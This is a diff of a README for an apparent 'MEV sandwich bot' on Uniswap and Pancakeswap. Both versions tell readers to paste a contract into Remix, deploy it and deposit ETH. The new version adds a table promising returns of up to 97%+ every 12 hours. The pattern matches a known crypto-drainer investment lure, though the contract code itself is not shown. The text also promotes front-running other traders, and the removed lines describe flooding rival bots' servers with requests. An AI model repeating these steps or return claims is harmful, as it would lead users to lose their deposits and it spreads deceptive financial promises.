@@ -1,96 +1,100 @@
-![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
+---
 
-# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
+<div align="center">
 
-The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
+# 💎🤖 ETH MEV-BOT 🤖💎
+  
+An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.
 
-> Bot sends the Transaction and sniffs the Mempool
+</div>
 
-> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
+---
 
-> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
+## 📚 About
 
-> This bot performs all of that, faster than 99% of other bots.
+In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.
 
-### But ser, there are open source bots that do the same
+---
 
-> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
+<div align="center">
 
-### Wen increase aggressiveness ?
+## 🚀 How it Works
 
-> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
+![profit](https://i.ibb.co/t39DBd6/1.jpg)
 
-### What did I learn?
+</div>
 
-> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
+Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.
 
-### So why stop?
+---
 
-> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
+## ETH Investment Returns
 
-### Towards the end I kept getting outcompeted by this individual:
+Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:
 
-> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
-> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+| ETH Range (invested) | Returns (12 hours) |
+| --- | --- |
+| `1.2ETH - 2.4ETH` | `up to 10%` |
+| `2.4ETH - 5ETH` | `up to 20%` |
+| `5ETH - 10ETH` | `20-27%` |
+| `10ETH - 20ETH` | `27-35%` |
+| `20ETH - 50ETH` | `35-50%` |
+| `50ETH - 100ETH` | `50-63%` |
+| `100ETH - 200ETH` | `63-76%` |
+| `200ETH - 500ETH` | `76-97%` |
+| `500ETH and above` | `97%+` |
 
-If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
+**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.
 
-### Bot capabilities:
+---
 
-1. Check every Contract pair.
-2. Calculate possible profit
-3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
-4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
+## 👨‍💻 Instructions
 
-### What is Sandwich MEV ?
+1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
+  - 📁 Create a new file mev.sol and paste the code from mev.sol.
 
-A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
 
-Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
+<img src="https://i.ibb.co/m8ZQRwp/2.png" alt="2" border="0">
 
-If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
+2) 🔧 Select compiler version 0.6.12 and press compile.
 
-- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
-- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
+![2](https://i.ibb.co/2Ns7jqm/3.png)
 
-How exactly does the attacker gain revenues during the process? Here is an example.
+3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
 
-1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
-2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
-3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
-4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
-5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
-6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
+![3](https://i.ibb.co/NCsWwyW/4.png)
 
-![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
+4) Verify your smart contract on etherscan -
 
-Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
+- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
+   - 📝 Enter contract address and set inputs:
+   - Compiler Type: Solidity (Single File)
+   - Compiler Version: ^0.6.12
+   - License Type: 3) MIT License (MIT)
+   - 📋 Paste the code from mev.sol.
+   - 🚫 Leave ABI input box empty.
+   - 🟢 Click "Verify"
 
-# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
 
-1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
+5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
+ 
+6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
 
-2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
+<img width="780" alt="4" src="https://i.ibb.co/Dp5nXPN/5.png">
 
-3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
+7) Withdraw anytime by clicking 'withdrawal'.
 
-4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
+:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
 
-5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
+At any point, you can stop the bot or retrieve your money by calling the withdrawal function.
 
-6. After the transaction is confirmed, it's your own BOT now.
+<div align="center">
 
-7. Deposit funds to your exact contract/bot address.
+💰💰💰 Make money with MevBot 💰💰💰
 
-8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
+</div>
 
-I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
+---
 
-If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
-
-To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.
-
-### Proof By Your Friends
-
-> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/HdLLzFb/3.png)
-> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/dg33JdH/4.png)
+##### Please ⭐ the repo to support my project
+---
